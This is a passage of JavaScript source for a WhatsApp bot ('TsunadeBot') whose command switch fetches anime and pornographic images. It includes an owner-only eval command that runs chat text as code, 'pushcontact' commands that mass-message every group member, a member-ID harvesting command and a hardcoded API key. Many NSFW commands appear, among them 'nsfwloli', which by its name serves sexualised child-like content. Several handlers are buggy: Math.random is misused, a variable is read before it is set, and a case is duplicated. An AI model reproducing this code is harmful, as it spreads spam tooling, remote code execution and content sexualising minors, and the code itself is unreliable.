if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
TsunadeBot.sendMessage(m.chat, { image: { url: yeha }, caption : message.success }, { quoted: m })
}
break
case '>':
case '=>':
if (!MznKingTheCreator) return MznKingOwnerReply()
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replygcmznking(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcmznking(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcmznking(util.format(_syntax + _err))
}
break
case 'pushcontact': {
    if (!MznKingTheCreator) return MznKingOwnerReply()
      if (!m.isGroup) return replygcmznking(`The feature works only in grup`)
    if (!text) return replygcmznking(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcmznking(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    TsunadeBot.sendMessage(pler, { text: q})
     }  
     replygcmznking(`Done`)
      }
      break
case "pushcontactv2":{
if (!MznKingTheCreator) return MznKingOwnerReply()
if (!q) return replygcmznking(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
await MznKingWaitReply()
const metadata2 = await TsunadeBot.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
TsunadeBot.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcmznking(`Success`)
}
break

            case 'id':{
            replygcmznking(from)
           }
          break
          case 'userjid':{
          	if(!MznKingTheCreator) return MznKingOwnerReply()
        const groupMetadata = m.isGroup ? await TsunadeBot.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `🧚 ${mem.id}\n`
        }
      replygcmznking(textt)
    }
    break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcmznking(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replygcmznking(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await TsunadeBot.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	case 'hentaivid2': {
if (!m.isGroup) return MznKingGroupReply()

if (!AntiNsfw) return replygmznking(mess.nsfw)
await MznKingWaitReply()
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
TsunadeBot.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `➢ Title : ${cejd.title}
➢ Category : ${cejd.category}
➢ Mimetype : ${cejd.type}
➢ Views : ${cejd.views_count}
➢ Shares : ${cejd.share_count}
➢ Source : ${cejd.link}
➢ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return MznKingGroupReply()
if (!AntiNsfw) return replygcmznking(mess.nsfw)
                await MznKingWaitReply()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                TsunadeBot.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `🧚 Title : ${result912.title}\n🧚 Category : ${result912.category}\n🧚 Mimetype : ${result912.type}\n🧚 Views : ${result912.views_count}\n🧚 Shares : ${result912.share_count}\n🧚 Source : ${result912.link}\n🧚 Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return MznKingGroupReply()
if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return MznKingGroupReply()
if (!AntiNsfw) return replygcmznking(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return MznKingGroupReply()
if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return MznKingGroupReply()
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return MznKingGroupReply()
if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await TsunadeBot.sendMessage(m.chat, { caption:  `*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
break
case 'ahegao':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'thighs':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thighs.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return MznKingGroupReply()
	if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var mznkingzresult = pickRandom(ahegaonsfw)
TsunadeBot.sendMessage(m.chat, { caption: message.success, image: { url: mznkingzresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return MznKingGroupReply()
if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await TsunadeBot.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return MznKingGroupReply()
if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var mznkingzresultx = pickRandom(ahegaonsfw)
    await TsunadeBot.sendMessage(m.chat,{video:mznkingzresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return MznKingGroupReply()
if (!AntiNsfw) return replygcmznking(mess.nsfw)
await MznKingWaitReply()
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/mznking/assets/master/foot.json')
TsunadeBot.sendMessage(m.chat, { image: { url: yeha }, caption : message.success }, { quoted: m })
}
break
case 'animeawoo':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animemegumin':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animeshinobu':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animehandhold':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animehighfive':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animecringe':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animedance':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animehappy':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animeglomp':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animesmug':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animeblush':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animewave':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animesmile':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animepoke':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animewink':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animebonk':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animebully':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animeyeet':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animebite':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animelick':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animekill':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animecry':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animewlp':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animekiss':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animehug':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animeneko':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animepat':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
